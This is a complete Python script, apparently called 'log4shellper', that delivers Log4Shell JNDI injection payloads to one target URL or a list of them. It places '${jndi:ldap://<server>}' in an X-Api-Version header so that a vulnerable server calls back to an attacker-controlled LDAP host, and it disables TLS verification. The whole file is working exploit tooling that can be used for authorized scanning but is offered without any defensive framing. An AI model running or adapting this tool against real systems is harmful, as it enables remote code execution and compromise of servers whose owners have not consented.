#!/usr/bin/python3
import argparse
import json
import requests
import textwrap
import sys

from colorama import init
from termcolor import cprint
from pyfiglet import figlet_format
from pygments import highlight, lexers, formatters
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import RequestException


"""
Simple little log4shell tool.
Author: Thomas Gordon.
All rights reserved.
"""


def arg():

    parser = argparse.ArgumentParser(
        prog='log4shellper',
        description='Simple little log4shell tool.'
    )

    targets = parser.add_mutually_exclusive_group()
    targets.add_argument(
        '-l', '--list',
        dest='list',
        help="Takes a filepath to a list of target urls.",
        type=str
    )
    targets.add_argument(
        '-u', '--url',
        dest='url',
        help="Takes a target url, e.g. http://127.0.0.1:8080'",
        type=str
    )
    attacker = parser.add_mutually_exclusive_group()
    attacker.add_argument(
        '--payload',
        dest='payload',
        help= textwrap.dedent(
            '''\
            Replaces default payload with a custom payload.
            This option cannot be used with the --server option.
            \n
            DEFAULT payload: 'X-Api-Version: ${jndi:ldap://<server>/}'
            OPTIONAL ARGUMENT
            '''),
        type=str
    )
    attacker.add_argument(
        '-s', '--server',
        dest='server',
        help="Takes a server FQDN or IP address.",
        type=str
    )
    args, pocket = parser.parse_known_args()

    return args


def banner():
    # An unnecessary evil

    # Strip colors when stdout is redirected
    init(strip=not sys.stdout.isatty())

    cprint(
        figlet_format('Little', font='slant'),
        'red', attrs=['bold']
    )
    cprint(
        figlet_format('Log4Shellper', font='slant'),
        'green', attrs=['bold']
    )



def pprint_json(data):

    json_data  = json.dumps(dict(data), indent=4)
    color_json = lambda json: highlight(json, lexers.JsonLexer(), formatters.TerminalFormatter())

    print(color_json(json_data))


def request(url, payload):
    """
    Sends a GET request to url, with the payload injected into the X-Api-Version header.
    Payload will phone home to server if exploit was succesful.
    """
    # Build headers
    headers = { 'User-Agent': 'log4shellper' }
    headers |= payload

    # Suppress InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    try:
        req = requests.get(url, headers=headers, verify=False)
        req.raise_for_status()
    except RequestException as e:
        response = {
            'url'   : url,
            'error' : str(e) + ". Check provided URL?"
        }
    else:
        response = {
            'method'  : req.request.method,
            'url'     : url,
            'headers' : dict(req.request.headers),
            'status_code' : req.status_code,
        }

    return response


def main():

    banner()

    # Get cli input from argparse
    args = arg()

    # Execution block
    try:
        # Check if --server or --payload is used and build dict(payload) accordingly
        if args.server is not None:
            server = args.server
            payload = { 'X-Api-Version' : f"${{jndi:ldap://{server}}}" }
            print(payload)
        elif args.payload is not None:
            header_key, colon, header_val = args.payload.partition(':')
            payload = { header_key : header_val }
        else:
            print('Please provide either a server or custom payload. See --help for usage.')
            sys.exit(1)

        # Check if --url or --list is used. Cast to list.
        if args.url is not None:
            targets = [args.url]
        elif args.list is not None:
            with open(args.list) as file:
                targets = file.read().splitlines()
        else:
            print('Please provide at least one URL. See --help for usage.')
            sys.exit(1)
    except Exception as e:
        print(e)
        sys.exit(1)

    # call request for each target url, format JSON output, then print
    [pprint_json(request(url, payload)) for url in targets]

if __name__ == '__main__':
    main()
